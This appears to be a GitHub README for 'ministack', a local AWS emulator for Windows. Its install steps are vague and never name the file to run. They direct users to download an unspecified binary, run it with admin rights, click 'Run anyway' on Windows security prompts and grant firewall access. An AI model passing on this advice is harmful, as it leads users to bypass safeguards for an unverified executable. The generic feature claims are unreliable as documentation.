# 🧱 ministack - Run AWS tools on your PC

[![Download ministack](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)

## 📦 What is ministack?

ministack is a local AWS emulator for Windows. It lets you run a set of common AWS services on your own computer. You can use it for testing, learning, and local app work without setting up real cloud services.

It is made for people who want a simple way to work with AWS-style tools at home or in a dev setup. It supports more than 40 services, works with Terraform, and includes real databases for local use.

## ✅ What you get

- Local AWS-style services on Windows
- Support for 40+ cloud services
- S3-style file storage
- DynamoDB-style tables
- SQS-style queues
- Lambda-style functions
- EC2-style test setup
- Docker-based local use
- Terraform support
- Open-source MIT license

## 🖥️ System requirements

Before you install ministack, make sure your PC meets these basic needs:

- Windows 10 or Windows 11
- 64-bit system
- At least 8 GB RAM
- 10 GB free disk space
- Internet access for the first download
- Admin rights on the PC
- Docker Desktop installed if the release package uses Docker

## 🚀 Download ministack

Use the release page to visit this page to download the Windows build that matches your PC:

[Visit the ministack releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)

After you open the page, look for the latest release and download the Windows file from the Assets list.

## 🔧 Install on Windows

1. Open the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases).
2. Find the latest release at the top of the page.
3. Look under Assets.
4. Download the Windows file that fits your setup.
5. If the file is a zip file, extract it to a folder like `C:\ministack`.
6. If the file is an installer, open it and follow the setup steps.
7. If Windows asks for permission, choose Yes.
8. If the release uses Docker, start Docker Desktop first.

## ▶️ Run ministack

1. Open the folder where you saved ministack.
2. Start the app file or launcher from that folder.
3. Wait for the local services to start.
4. Open the app window or local web page if one appears.
5. Keep the app open while you use your local AWS services.

If the app opens in a browser, leave that tab open while your test tools run.

## 🧭 First use

After ministack starts, you can begin using local services for test work.

A common first setup looks like this:

1. Create a local S3 bucket for files.
2. Create a DynamoDB table for test data.
3. Start a queue for background jobs.
4. Run a Lambda test function.
5. Point your app or tool to the local endpoints.

If you use Terraform, set it to the local endpoints that ministack provides.

## 🗂️ Typical use cases

- Test an app before using real AWS
- Store test files in a local S3 setup
- Save and read sample data in DynamoDB
- Try queue-based work with SQS
- Run Lambda code on your own PC
- Check Terraform files before cloud deploys
- Build and test tools that use AWS SDK calls

## 🧰 Common workflow

A simple local workflow can look like this:

1. Start ministack.
2. Open your app project.
3. Change the AWS endpoint in your app settings.
4. Run your app.
5. Watch how it uses the local services.
6. Fix any setup issue before you move to real AWS.

This keeps your test work on your PC and helps you check changes fast.

## 🔌 Service support

ministack is built to cover a wide set of AWS-style services. That includes common tools used in day-to-day app work:

- Compute services
- File storage
- Queue services
- Table storage
- Local databases
- Event and job tools
- Network and app test tools

It aims to act like AWS in the places most local test setups need.

## 🧪 Terraform use

If you use Terraform, ministack can help you test your stack before you deploy it to AWS.

A simple setup often includes:

- A local provider config
- Local service endpoints
- Test buckets, tables, and queues
- A short Terraform plan run

This helps you spot setup issues early.

## 🔐 Data and local storage

ministack uses local storage on your PC. That means your test data stays on your device while the app runs.

This is useful when you want:

- Fast test cycles
- No cloud bill for local work
- Data that you can reset with ease
- Real database behavior in a local setup

## 🛠️ If the app does not start

If ministack does not open, try these steps:

1. Check that you downloaded the latest Windows release.
2. Make sure you extracted the files if the download was a zip file.
3. Run the file as an admin.
4. Start Docker Desktop first if the release needs it.
5. Close other heavy apps and try again.
6. Restart your PC and launch ministack one more time.

## 🧩 If Windows blocks the file

If Windows shows a security prompt:

1. Open the file menu or right-click the file.
2. Choose Run anyway if you trust the source.
3. Allow access if Windows asks for firewall permission.
4. Keep the app on your local network only if your setup needs it.

## 📁 Suggested folder setup

You can keep ministack in a simple folder so it is easy to find later:

- `C:\ministack`
- `C:\Tools\ministack`
- `D:\Apps\ministack`

Keep the app in a folder with a short path. This helps with setup and file access.

## 🧭 Where to find updates

Check the releases page when you want the latest version:

[Open ministack releases](https://github.com/Umair-ul-Hassan-cmd/ministack/releases)

Use the newest release file each time you update.

## 📌 Project details

- Repository: ministack
- Type: Local AWS emulator
- License: MIT
- Main platform: Windows
- Topics: aws, aws-emulator, aws-local, aws-sdk, devtools, docker, dynamodb, ec2, emulator, lambda, localstack, localstack-alternative, ministack, mock-aws, open-source, python, s3, sqs, terraform

## 🧾 What to expect after setup

Once ministack runs, you should see local AWS-style tools ready for use. You can point your app, SDK, or Terraform config to the local service URLs and begin testing right away.

A normal setup gives you a local place to work with buckets, tables, queues, and app code without using a real cloud account.

## 🧷 Quick install path

1. Visit the [releases page](https://github.com/Umair-ul-Hassan-cmd/ministack/releases).
2. Download the Windows release file.
3. Extract or install it.
4. Open the app.
5. Keep it running while you test your app